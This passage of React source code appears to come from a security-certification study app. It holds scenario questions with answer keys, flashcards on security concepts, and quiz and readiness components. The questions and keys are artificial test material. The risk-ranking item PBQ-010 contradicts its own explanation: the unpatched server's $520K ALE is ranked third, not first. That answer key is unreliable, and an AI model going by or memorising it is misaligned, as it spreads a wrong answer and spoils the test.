    scenario: 'You are configuring wireless security for a corporate office with 500 employees. The network will handle sensitive financial data.',
    task: 'Select ALL appropriate security configurations:',
    type: 'multi-select',
    options: [
      { id: 'a', text: 'WPA3-Enterprise with 802.1X authentication', correct: true },
      { id: 'b', text: 'WPA2-Personal with strong passphrase', correct: false },
      { id: 'c', text: 'RADIUS server for centralized authentication', correct: true },
      { id: 'd', text: 'Disable SSID broadcast for security', correct: false },
      { id: 'e', text: 'Implement wireless IDS/IPS', correct: true },
      { id: 'f', text: 'Use certificate-based authentication (EAP-TLS)', correct: true },
      { id: 'g', text: 'WEP with MAC filtering', correct: false }
    ],
    explanation: 'Enterprise environments need WPA3-Enterprise with 802.1X/RADIUS for individual credentials. EAP-TLS provides strongest authentication. WIDS/WIPS detects rogue APs. WPA2-Personal uses shared keys (not scalable). Hiding SSID provides no real security. WEP is completely broken.',
    points: 30
  },
  {
    id: 'PBQ-010',
    title: 'Risk Assessment Matrix',
    domain: 5,
    difficulty: 'advanced',
    scenario: 'Complete a risk assessment for these scenarios:\n\n1. Unpatched public web server (exploited weekly, causes 4-hour outage)\n2. Laptop theft (occurs monthly, costs $2,000 per incident)\n3. Ransomware attack (occurs yearly, costs $500,000)\n4. Insider data theft (occurs every 5 years, costs $2,000,000)',
    task: 'Rank these risks from HIGHEST to LOWEST Annual Loss Expectancy (ALE):',
    type: 'ordering',
    items: [
      { id: '1', text: 'Ransomware attack ($500K × 1/year = $500K ALE)', order: 1 },
      { id: '2', text: 'Insider theft ($2M × 0.2/year = $400K ALE)', order: 2 },
      { id: '3', text: 'Unpatched server (estimate $10K × 52/year = $520K ALE)', order: 3 },
      { id: '4', text: 'Laptop theft ($2K × 12/year = $24K ALE)', order: 4 }
    ],
    explanation: 'ALE = SLE × ARO. The unpatched server actually has highest ALE due to weekly occurrence. However, ranking may vary based on SLE estimates. Key concept: frequent low-impact events can exceed rare high-impact events.',
    points: 30
  },
  {
    id: 'PBQ-011',
    title: 'Phishing Email Analysis',
    domain: 2,
    difficulty: 'intermediate',
    scenario: 'Analyze this email header and content:\n\nFrom: IT-Support@company-secure.net\nReply-To: support@mail.ru\nSubject: Urgent: Password Expires in 24 Hours!\n\nDear Employee,\nYour password will expire in 24 hours. Click here to update:\nhttp://company-secure.net.verify-login.com/update\n\nIT Support Team',
    task: 'Identify ALL phishing indicators:',
    type: 'multi-select',
    options: [
      { id: 'a', text: 'Mismatched From and Reply-To domains', correct: true },
      { id: 'b', text: 'Urgency language ("24 hours")', correct: true },
      { id: 'c', text: 'Suspicious URL structure (subdomain trick)', correct: true },
      { id: 'd', text: 'Generic greeting ("Dear Employee")', correct: true },
      { id: 'e', text: 'Reply-To uses foreign domain (.ru)', correct: true },
      { id: 'f', text: 'Legitimate company name in From address', correct: false },
      { id: 'g', text: 'Request involves password/credentials', correct: true }
    ],
    explanation: 'Red flags: Reply-To differs from From (replies go to attacker), urgency creates pressure, URL uses subdomain to look legitimate but actual domain is verify-login.com, generic greeting shows mass phishing, .ru domain suspicious for US company, credential requests via email are suspicious.',
    points: 25
  },
  {
    id: 'PBQ-012',
    title: 'Backup Strategy Design',
    domain: 3,
    difficulty: 'intermediate',
    scenario: 'Design a backup strategy for a company with:\n- 2TB of critical data changing daily\n- RPO requirement: 4 hours maximum data loss\n- RTO requirement: 2 hours maximum downtime\n- Budget for cloud storage',
    task: 'Select the BEST backup configuration:',
    type: 'multi-select',
    options: [
      { id: 'a', text: 'Full backup weekly, incremental every 4 hours', correct: true },
      { id: 'b', text: 'Full backup monthly, differential weekly', correct: false },
      { id: 'c', text: 'Replicate to cloud for offsite copy', correct: true },
      { id: 'd', text: 'Hot site or cloud failover for 2-hour RTO', correct: true },
      { id: 'e', text: 'Cold site for disaster recovery', correct: false },
      { id: 'f', text: 'Test restores quarterly', correct: true },
      { id: 'g', text: 'Encrypt backups at rest and in transit', correct: true }
    ],
    explanation: '4-hour RPO requires backups at least every 4 hours (incremental is efficient). 2-hour RTO requires hot site or cloud failover (cold site takes days). Cloud provides 3-2-1 compliance. Testing ensures recoverability. Encryption protects backup data.',
    points: 30
  },
  {
    id: 'PBQ-013',
    title: 'SIEM Alert Triage',
    domain: 4,
    difficulty: 'advanced',
    scenario: 'Your SIEM generated these alerts in the last hour. Prioritize for investigation:\n\n1. Failed login attempts: 500 from single IP to admin account\n2. Antivirus detected PUP on marketing workstation\n3. Outbound connection to known C2 server from finance PC\n4. User accessed SharePoint after hours (normal for this user)\n5. Large data transfer (5GB) to external cloud storage',
    task: 'Rank from HIGHEST to LOWEST priority:',
    type: 'ordering',
    items: [
      { id: '1', text: 'C2 server connection from finance PC', order: 1 },
      { id: '2', text: '500 failed logins to admin account', order: 2 },
      { id: '3', text: '5GB transfer to external cloud', order: 3 },
      { id: '4', text: 'Antivirus detected PUP', order: 4 },
      { id: '5', text: 'After-hours SharePoint access (normal user)', order: 5 }
    ],
    explanation: 'C2 connection indicates active compromise - immediate threat. Brute force against admin is serious. Large external transfer could be exfiltration. PUP is low risk but needs cleanup. After-hours access by normal user is likely false positive.',
    points: 25
  },
  {
    id: 'PBQ-014',
    title: 'Cloud Shared Responsibility',
    domain: 3,
    difficulty: 'intermediate',
    scenario: 'Your company uses AWS EC2 (IaaS) for web servers, Azure App Service (PaaS) for APIs, and Microsoft 365 (SaaS) for email.',
    task: 'Match each security responsibility to the correct party:',
    type: 'multi-select',
    options: [
      { id: 'a', text: 'EC2: Customer patches operating system', correct: true },
      { id: 'b', text: 'EC2: AWS manages physical security', correct: true },
      { id: 'c', text: 'App Service: Customer manages runtime patching', correct: false },
      { id: 'd', text: 'App Service: Customer secures application code', correct: true },
      { id: 'e', text: 'M365: Microsoft manages email server patching', correct: true },
      { id: 'f', text: 'M365: Customer configures access policies', correct: true },
      { id: 'g', text: 'All: Customer responsible for data classification', correct: true }
    ],
    explanation: 'IaaS (EC2): Customer manages OS up, provider manages physical. PaaS (App Service): Provider manages runtime, customer manages code. SaaS (M365): Provider manages everything except data/access. Customer always responsible for their data regardless of model.',
    points: 25
  },
  {
    id: 'PBQ-015',
    title: 'Digital Forensics Procedure',
    domain: 4,
    difficulty: 'advanced',
    scenario: 'A laptop is suspected of containing evidence of data theft. The laptop is currently powered on with the user logged in.',
    task: 'Arrange the forensic steps in correct order:',
    type: 'ordering',
    items: [
      { id: '1', text: 'Document the scene (photos, notes, timestamps)', order: 1 },
      { id: '2', text: 'Capture volatile data (RAM, running processes)', order: 2 },
      { id: '3', text: 'Disconnect from network (prevent remote wipe)', order: 3 },
      { id: '4', text: 'Create forensic disk image with write blocker', order: 4 },
      { id: '5', text: 'Generate and verify hash of original and image', order: 5 },
      { id: '6', text: 'Analyze the forensic image (never original)', order: 6 }
    ],
    explanation: 'Order of volatility: RAM first (lost on power off). Document before touching. Network disconnect prevents tampering. Forensic image preserves evidence. Hash proves integrity. Always analyze copy, not original. This maintains chain of custody.',
    points: 30
  }
];


// ═══════════════════════════════════════════════════════════════
// FLASHCARD DATA (Key concepts from each domain)
// ═══════════════════════════════════════════════════════════════
const FLASHCARD_DATA = [
  // Domain 1 - Security Concepts
  { id: 'FC-001', domain: 1, front: 'What are the three components of the CIA Triad?', back: 'Confidentiality (prevent unauthorized disclosure)\nIntegrity (prevent unauthorized modification)\nAvailability (ensure authorized access)' },
  { id: 'FC-002', domain: 1, front: 'What are the five authentication factors?', back: '1. Knowledge (something you know)\n2. Possession (something you have)\n3. Inherence (something you are)\n4. Location (somewhere you are)\n5. Behavior (something you do)' },
  { id: 'FC-003', domain: 1, front: 'What is Zero Trust?', back: 'Security model that assumes no implicit trust. Every access request must be verified regardless of source. "Never trust, always verify."' },
  { id: 'FC-004', domain: 1, front: 'Symmetric vs Asymmetric encryption?', back: 'Symmetric: Same key encrypts/decrypts (AES) - fast\nAsymmetric: Key pair (public/private) - slower but solves key distribution' },
  { id: 'FC-005', domain: 1, front: 'What is a digital signature?', back: 'Created by signing hash with private key. Provides: Integrity, Authentication, Non-repudiation. Verified with public key.' },
  { id: 'FC-006', domain: 1, front: 'What is the purpose of salting passwords?', back: 'Adding random data before hashing to prevent rainbow table attacks. Each password gets unique salt.' },
  { id: 'FC-007', domain: 1, front: 'What makes FIDO2 phishing-resistant?', back: 'Credentials are bound to specific origin (website). Cannot be used on fake sites. Hardware security key required.' },
  { id: 'FC-008', domain: 1, front: 'FAR vs FRR vs CER in biometrics?', back: 'FAR: False Acceptance Rate (security issue)\nFRR: False Rejection Rate (usability issue)\nCER: Crossover Error Rate (where FAR=FRR, lower is better)' },
  
  // Domain 2 - Threats
  { id: 'FC-009', domain: 2, front: 'What is an APT?', back: 'Advanced Persistent Threat: Sophisticated, long-term attack campaign. Usually nation-state actors. Focused on specific targets.' },
  { id: 'FC-010', domain: 2, front: 'Phishing vs Spear Phishing vs Whaling?', back: 'Phishing: Mass, generic attacks\nSpear Phishing: Targeted at specific individuals\nWhaling: Targeting senior executives' },
  { id: 'FC-011', domain: 2, front: 'Virus vs Worm vs Trojan?', back: 'Virus: Needs host file, requires user action\nWorm: Self-propagating, no user action\nTrojan: Disguised as legitimate, no self-replication' },
  { id: 'FC-012', domain: 2, front: 'What is SQL Injection?', back: 'Attack inserting malicious SQL into application queries. Can read/modify/delete data. Prevented by parameterized queries.' },
  { id: 'FC-013', domain: 2, front: 'What is XSS (Cross-Site Scripting)?', back: 'Injecting malicious scripts into web pages viewed by others. Types: Stored, Reflected, DOM-based. Steal cookies/sessions.' },
  { id: 'FC-014', domain: 2, front: 'What are IOCs vs IOAs?', back: 'IOC: Indicator of Compromise - evidence of breach (file hashes, IPs)\nIOA: Indicator of Attack - behavioral evidence of attack in progress' },
  { id: 'FC-015', domain: 2, front: 'What is MITRE ATT&CK?', back: 'Framework mapping adversary TTPs (Tactics, Techniques, Procedures). Tactics = goals, Techniques = methods.' },
  { id: 'FC-016', domain: 2, front: 'What are the Cyber Kill Chain stages?', back: 'Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives' },

  // Domain 3 - Architecture
  { id: 'FC-017', domain: 3, front: 'IDS vs IPS?', back: 'IDS: Intrusion Detection - monitors and alerts (passive)\nIPS: Intrusion Prevention - monitors, detects, blocks (inline, active)' },
  { id: 'FC-018', domain: 3, front: 'What is a NGFW?', back: 'Next-Generation Firewall: Traditional firewall + IPS + application awareness + deep packet inspection + threat intelligence.' },
  { id: 'FC-019', domain: 3, front: 'IaaS vs PaaS vs SaaS responsibilities?', back: 'IaaS: Customer manages OS and up\nPaaS: Customer manages apps and data\nSaaS: Customer manages data/access only' },
  { id: 'FC-020', domain: 3, front: 'What is CASB?', back: 'Cloud Access Security Broker: Provides visibility into cloud usage, enforces security policies, between users and cloud services.' },
  { id: 'FC-021', domain: 3, front: 'WPA3 improvements over WPA2?', back: 'SAE (replaces PSK) - resists offline attacks\nPMF - management frame protection\n192-bit security for enterprise\nOpportunistic Wireless Encryption' },
  { id: 'FC-022', domain: 3, front: 'What is the 3-2-1 backup rule?', back: '3 copies of data\n2 different media types\n1 copy offsite' },
  { id: 'FC-023', domain: 3, front: 'Hot vs Warm vs Cold site?', back: 'Hot: Fully equipped, immediate failover\nWarm: Equipment ready, hours to activate\nCold: Empty space, days to set up' },
  { id: 'FC-024', domain: 3, front: 'RTO vs RPO?', back: 'RTO: Recovery Time Objective - max acceptable downtime\nRPO: Recovery Point Objective - max acceptable data loss (time)' },

  // Domain 4 - Operations
  { id: 'FC-025', domain: 4, front: 'What is SIEM?', back: 'Security Information and Event Management: Aggregates logs from multiple sources, correlates events, detects threats, enables investigation.' },
  { id: 'FC-026', domain: 4, front: 'What is SOAR?', back: 'Security Orchestration, Automation, Response: Automates incident response workflows, connects security tools, executes playbooks.' },
  { id: 'FC-027', domain: 4, front: 'NIST Incident Response phases?', back: 'Preparation → Detection & Analysis → Containment/Eradication/Recovery → Post-Incident Activity (Lessons Learned)' },
  { id: 'FC-028', domain: 4, front: 'What is Order of Volatility?', back: 'Collect most volatile evidence first:\n1. CPU/RAM\n2. Swap/temp files\n3. Running processes\n4. Disk\n5. Logs\n6. Physical config' },
  { id: 'FC-029', domain: 4, front: 'DAC vs MAC vs RBAC vs ABAC?', back: 'DAC: Owner decides (discretionary)\nMAC: Labels/classifications (mandatory)\nRBAC: Based on job roles\nABAC: Multiple attributes (most granular)' },
  { id: 'FC-030', domain: 4, front: 'What is PAM?', back: 'Privileged Access Management: Manages admin/privileged accounts. Features: vaulting, session recording, JIT access, approval workflows.' },
  { id: 'FC-031', domain: 4, front: 'MTTR vs MTTD?', back: 'MTTR: Mean Time To Repair/Recover\nMTTD: Mean Time To Detect' },
  { id: 'FC-032', domain: 4, front: 'What is a forensic image?', back: 'Bit-for-bit copy of storage media. Captures everything including deleted data, slack space. Use write blocker. Hash to verify.' },

  // Domain 5 - Governance
  { id: 'FC-033', domain: 5, front: 'Policy vs Standard vs Procedure vs Guideline?', back: 'Policy: High-level, mandatory, what/why\nStandard: Specific requirements\nProcedure: Step-by-step how\nGuideline: Optional recommendations' },
  { id: 'FC-034', domain: 5, front: 'How to calculate ALE?', back: 'ALE = SLE × ARO\nSLE = Asset Value × Exposure Factor\nARO = Annual Rate of Occurrence' },
  { id: 'FC-035', domain: 5, front: 'Four risk treatment options?', back: 'Avoid: Eliminate the risk source\nTransfer: Insurance, contracts\nMitigate: Implement controls\nAccept: Document and proceed' },
  { id: 'FC-036', domain: 5, front: 'What is residual risk?', back: 'Risk remaining after security controls are implemented. Cannot be eliminated completely. Must be within risk appetite.' },
  { id: 'FC-037', domain: 5, front: 'SOC 2 Type I vs Type II?', back: 'Type I: Point-in-time control design\nType II: Control operation over 6-12 months (more rigorous)' },
  { id: 'FC-038', domain: 5, front: 'NIST CSF Core Functions?', back: 'Identify → Protect → Detect → Respond → Recover' },
  { id: 'FC-039', domain: 5, front: 'GDPR breach notification timeline?', back: '72 hours to notify supervisory authority after becoming aware of breach.' },
  { id: 'FC-040', domain: 5, front: 'What is BIA?', back: 'Business Impact Analysis: Identifies critical business functions, dependencies, and recovery priorities. Determines RTO/RPO requirements.' }
];

// ═══════════════════════════════════════════════════════════════
// FLASHCARD COMPONENT
// ═══════════════════════════════════════════════════════════════
const Flashcards = ({ progress, setProgress, setView }) => {
  const [domain, setDomain] = useState(0); // 0 = all
  const [cards, setCards] = useState([]);
  const [currentIndex, setCurrentIndex] = useState(0);
  const [flipped, setFlipped] = useState(false);
  const [known, setKnown] = useState(new Set());
  const [learning, setLearning] = useState(new Set());
  const [started, setStarted] = useState(false);

  const startStudy = () => {
    const filtered = domain === 0 
      ? FLASHCARD_DATA 
      : FLASHCARD_DATA.filter(f => f.domain === domain);
    setCards(shuffleArray([...filtered]));
    setCurrentIndex(0);
    setFlipped(false);
    setKnown(new Set());
    setLearning(new Set());
    setStarted(true);
  };

  const handleKnow = () => {
    setKnown(prev => new Set([...prev, cards[currentIndex].id]));
    nextCard();
  };

  const handleLearning = () => {
    setLearning(prev => new Set([...prev, cards[currentIndex].id]));
    nextCard();
  };

  const nextCard = () => {
    setFlipped(false);
    if (currentIndex < cards.length - 1) {
      setCurrentIndex(prev => prev + 1);
    } else {
      setStarted(false); // Show results
    }
  };

  if (!started && cards.length > 0) {
    // Results screen
    const knownCount = known.size;
    const learningCount = learning.size;
    const percentage = Math.round((knownCount / cards.length) * 100);

    return (
      <div style={{ padding: 24, maxWidth: 600, margin: '0 auto' }}>
        <Card style={{ textAlign: 'center', marginBottom: 24 }}>
          <div style={{ fontSize: 48, marginBottom: 16 }}>📚</div>
          <h2 style={{ marginBottom: 16 }}>Study Session Complete!</h2>
          <div style={{ display: 'flex', justifyContent: 'center', gap: 32, marginBottom: 24 }}>
            <div>
              <div style={{ fontSize: 32, fontWeight: 700, color: colors.success }}>{knownCount}</div>
              <div style={{ color: colors.textMuted }}>Known</div>
            </div>
            <div>
              <div style={{ fontSize: 32, fontWeight: 700, color: colors.warning }}>{learningCount}</div>
              <div style={{ color: colors.textMuted }}>Still Learning</div>
            </div>
          </div>
          <ProgressBar value={knownCount} max={cards.length} color={colors.success} height={12} />
          <p style={{ marginTop: 8, color: colors.textSecondary }}>{percentage}% mastery</p>
        </Card>
        <div style={{ display: 'flex', gap: 12 }}>
          <Button onClick={() => { setCards([]); }} variant="secondary" style={{ flex: 1 }}>New Session</Button>
          <Button onClick={() => setView({ type: 'hub' })} style={{ flex: 1 }}>Return to Hub</Button>
        </div>
      </div>
    );
  }

  if (!started) {
    return (
      <div style={{ padding: 24, maxWidth: 600, margin: '0 auto' }}>
        <button onClick={() => setView({ type: 'hub' })} 
          style={{ background: 'none', border: 'none', color: colors.textSecondary, cursor: 'pointer', marginBottom: 16, fontSize: 14 }}>
          ← Back to Hub
        </button>

        <Card style={{ textAlign: 'center' }}>
          <div style={{ fontSize: 48, marginBottom: 16 }}>🎴</div>
          <h2 style={{ marginBottom: 8 }}>Flashcard Study</h2>
          <p style={{ color: colors.textSecondary, marginBottom: 24 }}>{FLASHCARD_DATA.length} cards covering key exam concepts</p>

          <div style={{ marginBottom: 24 }}>
            <label style={{ display: 'block', marginBottom: 8, color: colors.textSecondary }}>Select Domain:</label>
            <select value={domain} onChange={e => setDomain(Number(e.target.value))}
              style={{ width: '100%', padding: 12, background: colors.bgElevated, border: `1px solid ${colors.border}`, borderRadius: 8, color: colors.textPrimary, fontSize: 16 }}>
              <option value={0}>All Domains ({FLASHCARD_DATA.length} cards)</option>
              {[1,2,3,4,5].map(d => (
                <option key={d} value={d}>Domain {d}: {getDomainName(d)} ({FLASHCARD_DATA.filter(f => f.domain === d).length} cards)</option>
              ))}
            </select>
          </div>

          <Button onClick={startStudy} size="lg">Start Studying</Button>
        </Card>
      </div>
    );
  }

  const card = cards[currentIndex];

  return (
    <div style={{ padding: 24, maxWidth: 600, margin: '0 auto' }}>
      <div style={{ marginBottom: 20 }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 8, fontSize: 13, color: colors.textSecondary }}>
          <span>Card {currentIndex + 1} of {cards.length}</span>
          <span>✓ {known.size} | 📖 {learning.size}</span>
        </div>
        <ProgressBar value={currentIndex + 1} max={cards.length} color={getDomainColor(card.domain)} />
      </div>

      <div onClick={() => setFlipped(!flipped)} style={{ cursor: 'pointer', perspective: 1000 }}>
        <Card style={{ 
          minHeight: 250, 
          display: 'flex', 
          flexDirection: 'column',
          justifyContent: 'center', 
          alignItems: 'center',
          textAlign: 'center',
          background: flipped ? `${colors.success}10` : colors.bgSurface,
          borderLeft: `4px solid ${getDomainColor(card.domain)}`,
          transition: 'background 0.3s'
        }}>
          <Badge color={getDomainColor(card.domain)} style={{ marginBottom: 16 }}>Domain {card.domain}</Badge>
          
          {!flipped ? (
            <>
              <p style={{ fontSize: 18, fontWeight: 500, lineHeight: 1.6 }}>{card.front}</p>
              <p style={{ color: colors.textMuted, marginTop: 16, fontSize: 13 }}>Tap to reveal answer</p>
            </>
          ) : (
            <p style={{ fontSize: 16, lineHeight: 1.8, whiteSpace: 'pre-line', color: colors.textSecondary }}>{card.back}</p>
          )}
        </Card>
      </div>

      {flipped && (
        <div style={{ display: 'flex', gap: 12, marginTop: 20 }}>
          <Button onClick={handleLearning} variant="secondary" style={{ flex: 1 }}>
            📖 Still Learning
          </Button>
          <Button onClick={handleKnow} variant="success" style={{ flex: 1 }}>
            ✓ Got It!
          </Button>
        </div>
      )}
    </div>
  );
};


// ═══════════════════════════════════════════════════════════════
// EXAM READINESS ANALYZER
// ═══════════════════════════════════════════════════════════════
const ExamReadiness = ({ progress, setView }) => {
  const domains = [1, 2, 3, 4, 5];
  const weights = { 1: 12, 2: 22, 3: 18, 4: 28, 5: 20 };

  const getDomainStats = (domain) => {
    const lessons = LESSON_DATA.filter(l => l.domain === domain);
    const sims = SIMULATION_DATA.filter(s => s.domain === domain);
    const completedLessons = lessons.filter(l => progress.lessonProgress?.[l.id]?.completed).length;
    const completedSims = sims.filter(s => progress.simProgress?.[s.id]?.completed).length;
    const passedSims = sims.filter(s => progress.simProgress?.[s.id]?.passed).length;
    const quizScore = progress.quizProgress?.[`D${domain}`]?.percentage || 0;
    
    // Calculate domain readiness (weighted average)
    const lessonScore = lessons.length ? (completedLessons / lessons.length) * 100 : 0;
    const simScore = sims.length ? (passedSims / sims.length) * 100 : 0;
    const readiness = Math.round((lessonScore * 0.3) + (simScore * 0.3) + (quizScore * 0.4));
    
    return { 
      lessons: lessons.length, completedLessons,
      sims: sims.length, completedSims, passedSims,
      quizScore, readiness, weight: weights[domain]
    };
  };

  const overallReadiness = useMemo(() => {
    let totalWeighted = 0;
    let totalWeight = 0;
    domains.forEach(d => {
      const stats = getDomainStats(d);
      totalWeighted += stats.readiness * stats.weight;
      totalWeight += stats.weight;
    });
    return Math.round(totalWeighted / totalWeight);
  }, [progress]);

  const getReadinessLevel = (score) => {
    if (score >= 85) return { label: 'Exam Ready', color: colors.success, emoji: '🎯' };
    if (score >= 70) return { label: 'Almost Ready', color: colors.info, emoji: '📈' };
    if (score >= 50) return { label: 'Needs Work', color: colors.warning, emoji: '📚' };
    return { label: 'Not Ready', color: colors.error, emoji: '⚠️' };
  };

  const overall = getReadinessLevel(overallReadiness);

  const getRecommendations = () => {
    const recs = [];
    
    domains.forEach(d => {
      const stats = getDomainStats(d);
      if (stats.completedLessons < stats.lessons) {
        recs.push({ domain: d, priority: 'high', text: `Complete ${stats.lessons - stats.completedLessons} remaining lesson(s) in Domain ${d}` });
      }
      if (stats.passedSims < stats.sims) {
        recs.push({ domain: d, priority: 'high', text: `Pass ${stats.sims - stats.passedSims} simulation(s) in Domain ${d}` });
      }
      if (stats.quizScore < 85) {
        recs.push({ domain: d, priority: stats.quizScore < 70 ? 'high' : 'medium', text: `Improve Domain ${d} quiz score from ${stats.quizScore}% to 85%+` });
      }
    });

    // Sort by priority and domain weight
    return recs.sort((a, b) => {
      if (a.priority !== b.priority) return a.priority === 'high' ? -1 : 1;
      return weights[b.domain] - weights[a.domain];
    }).slice(0, 5);
  };

  const recommendations = getRecommendations();
  const examAttempts = (progress.practiceExams || []).length;
  const lastExamScore = examAttempts > 0 ? progress.practiceExams[examAttempts - 1].percentage : 0;

  return (
    <div style={{ padding: 24, maxWidth: 900, margin: '0 auto' }} className="slide-up">
      <button onClick={() => setView({ type: 'hub' })} 
        style={{ background: 'none', border: 'none', color: colors.textSecondary, cursor: 'pointer', marginBottom: 16, fontSize: 14 }}>
        ← Back to Hub
      </button>

      <h1 style={{ fontSize: 24, marginBottom: 24 }}>🎯 Exam Readiness Analysis</h1>

      {/* Overall Readiness */}
      <Card style={{ marginBottom: 24, textAlign: 'center' }}>
        <div style={{ fontSize: 64, marginBottom: 8 }}>{overall.emoji}</div>
        <h2 style={{ color: overall.color, marginBottom: 8 }}>{overall.label}</h2>
        <div style={{ fontSize: 48, fontWeight: 700, marginBottom: 16 }}>{overallReadiness}%</div>
        <ProgressBar value={overallReadiness} max={100} color={overall.color} height={16} />
        <p style={{ marginTop: 16, color: colors.textSecondary }}>
          {overallReadiness >= 85 
            ? "You're well-prepared for the exam! Consider taking a practice test."
            : overallReadiness >= 70
            ? "You're making good progress. Focus on weaker areas."
            : "Keep studying! Complete more lessons and simulations."}
        </p>
      </Card>

      {/* Domain Breakdown */}
      <Card style={{ marginBottom: 24 }}>
        <h3 style={{ marginBottom: 16 }}>Domain Readiness</h3>
        {domains.map(domain => {
          const stats = getDomainStats(domain);
          const level = getReadinessLevel(stats.readiness);
          const color = getDomainColor(domain);
          
          return (
            <div key={domain} style={{ marginBottom: 16, padding: 12, background: colors.bgElevated, borderRadius: 8 }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
                <div>
                  <Badge color={color}>D{domain}</Badge>
                  <span style={{ marginLeft: 8, fontWeight: 500 }}>{getDomainName(domain)}</span>
                  <span style={{ marginLeft: 8, fontSize: 12, color: colors.textMuted }}>({stats.weight}% of exam)</span>
                </div>
                <span style={{ color: level.color, fontWeight: 600 }}>{stats.readiness}%</span>
              </div>
              <ProgressBar value={stats.readiness} max={100} color={level.color} />
              <div style={{ display: 'flex', gap: 16, marginTop: 8, fontSize: 12, color: colors.textSecondary }}>
                <span>📚 Lessons: {stats.completedLessons}/{stats.lessons}</span>
                <span>🎮 Sims: {stats.passedSims}/{stats.sims}</span>
                <span>📝 Quiz: {stats.quizScore}%</span>
              </div>
            </div>
          );
        })}
      </Card>

      {/* Practice Exam Stats */}
      <Card style={{ marginBottom: 24 }}>
        <h3 style={{ marginBottom: 16 }}>Practice Exam Performance</h3>
        {examAttempts === 0 ? (
          <div style={{ textAlign: 'center', padding: 20 }}>
            <p style={{ color: colors.textSecondary, marginBottom: 16 }}>No practice exams taken yet</p>
            <Button onClick={() => setView({ type: 'practice-exam' })}>Take Practice Exam</Button>
          </div>
        ) : (
          <>
            <div style={{ display: 'flex', gap: 24, marginBottom: 16 }}>
              <div style={{ textAlign: 'center' }}>
                <div style={{ fontSize: 32, fontWeight: 700, color: colors.accent }}>{examAttempts}</div>
                <div style={{ fontSize: 12, color: colors.textMuted }}>Attempts</div>
              </div>
              <div style={{ textAlign: 'center' }}>
                <div style={{ fontSize: 32, fontWeight: 700, color: lastExamScore >= 85 ? colors.success : colors.warning }}>{lastExamScore}%</div>
                <div style={{ fontSize: 12, color: colors.textMuted }}>Last Score</div>
              </div>
              <div style={{ textAlign: 'center' }}>
                <div style={{ fontSize: 32, fontWeight: 700, color: colors.info }}>
                  {Math.round((progress.practiceExams || []).reduce((sum, e) => sum + e.percentage, 0) / examAttempts)}%
                </div>
                <div style={{ fontSize: 12, color: colors.textMuted }}>Average</div>
              </div>
            </div>
            <Button onClick={() => setView({ type: 'practice-exam' })} variant="secondary">Take Another Practice Exam</Button>
          </>
        )}
      </Card>

      {/* Recommendations */}
      {recommendations.length > 0 && (
        <Card>
          <h3 style={{ marginBottom: 16 }}>📋 Priority Recommendations</h3>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            {recommendations.map((rec, i) => (
              <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 12, padding: 12, background: colors.bgElevated, borderRadius: 8 }}>
                <span style={{ fontSize: 18 }}>{rec.priority === 'high' ? '🔴' : '🟡'}</span>
                <span style={{ flex: 1, color: colors.textSecondary }}>{rec.text}</span>
                <Button onClick={() => setView({ type: 'domain', domain: rec.domain })} variant="ghost" size="sm">
                  Go →
                </Button>
              </div>
            ))}
          </div>
        </Card>
      )}
    </div>
  );
};


// ═══════════════════════════════════════════════════════════════
// UPDATED PBQ PLAYER (using extended data)
// ═══════════════════════════════════════════════════════════════
const PBQPlayerUpdated = ({ progress, setProgress, setView }) => {
  const [currentPBQ, setCurrentPBQ] = useState(0);
  const [phase, setPhase] = useState('intro');
  const [answers, setAnswers] = useState({});
  const [submitted, setSubmitted] = useState(false);
  const [score, setScore] = useState(0);
  const [dragItems, setDragItems] = useState([]);

  const allPBQs = PBQ_DATA_EXTENDED;
  const pbq = allPBQs[currentPBQ];

  const startPBQ = () => {
    if (pbq.type === 'ordering') {
      setDragItems(shuffleArray([...pbq.items]));
    }
    setPhase('playing');
  };

  const handleMultiSelect = (optionId) => {
    if (submitted) return;
    setAnswers(prev => {
      const current = prev[pbq.id] || [];
      if (current.includes(optionId)) {
        return { ...prev, [pbq.id]: current.filter(id => id !== optionId) };
      }
      return { ...prev, [pbq.id]: [...current, optionId] };
    });
  };

  const handleOrderChange = (fromIndex, toIndex) => {
    if (submitted) return;
    const newItems = [...dragItems];
    const [moved] = newItems.splice(fromIndex, 1);
    newItems.splice(toIndex, 0, moved);
    setDragItems(newItems);
  };

  const handleSubmit = () => {
    setSubmitted(true);
    let points = 0;

    if (pbq.type === 'multi-select') {
      const selected = answers[pbq.id] || [];
      const correctIds = pbq.options.filter(o => o.correct).map(o => o.id);
      const allCorrect = correctIds.every(id => selected.includes(id));
      const noWrong = selected.every(id => correctIds.includes(id));
      if (allCorrect && noWrong) points = pbq.points;
      else if (selected.filter(id => correctIds.includes(id)).length > 0) points = Math.floor(pbq.points * 0.5);
    } else if (pbq.type === 'ordering') {
      const correct = dragItems.every((item, index) => item.order === index + 1);
      if (correct) points = pbq.points;
      else {
        const correctCount = dragItems.filter((item, index) => item.order === index + 1).length;
        points = Math.floor(pbq.points * (correctCount / dragItems.length));
      }
    }

    setScore(prev => prev + points);
  };

  const handleNext = () => {
    if (currentPBQ < allPBQs.length - 1) {
      setCurrentPBQ(prev => prev + 1);
      setSubmitted(false);
      setAnswers({});
      if (allPBQs[currentPBQ + 1].type === 'ordering') {
        setDragItems(shuffleArray([...allPBQs[currentPBQ + 1].items]));
      }
    } else {
      setPhase('results');
    }
  };

  const maxScore = allPBQs.reduce((sum, p) => sum + p.points, 0);

  if (phase === 'intro') {
    return (
      <div style={{ padding: 24, maxWidth: 700, margin: '0 auto' }}>
        <button onClick={() => setView({ type: 'hub' })} 
          style={{ background: 'none', border: 'none', color: colors.textSecondary, cursor: 'pointer', marginBottom: 16, fontSize: 14 }}>
          ← Back to Hub
        </button>

        <Card style={{ textAlign: 'center' }}>
          <div style={{ fontSize: 48, marginBottom: 16 }}>🔧</div>
          <h2 style={{ marginBottom: 8 }}>Performance-Based Questions</h2>
          <p style={{ color: colors.textSecondary, marginBottom: 16 }}>
            {allPBQs.length} hands-on scenarios testing practical skills
          </p>
          <div style={{ fontSize: 13, color: colors.textMuted, marginBottom: 24 }}>
            Topics: Firewall config, Log analysis, Incident response, Risk assessment, Phishing analysis, Backup strategy, SIEM triage, Cloud security, Forensics
          </div>
          <Button onClick={startPBQ} size="lg">Start PBQs</Button>
        </Card>
      </div>
    );
  }

  if (phase === 'results') {
    const percentage = Math.round((score / maxScore) * 100);
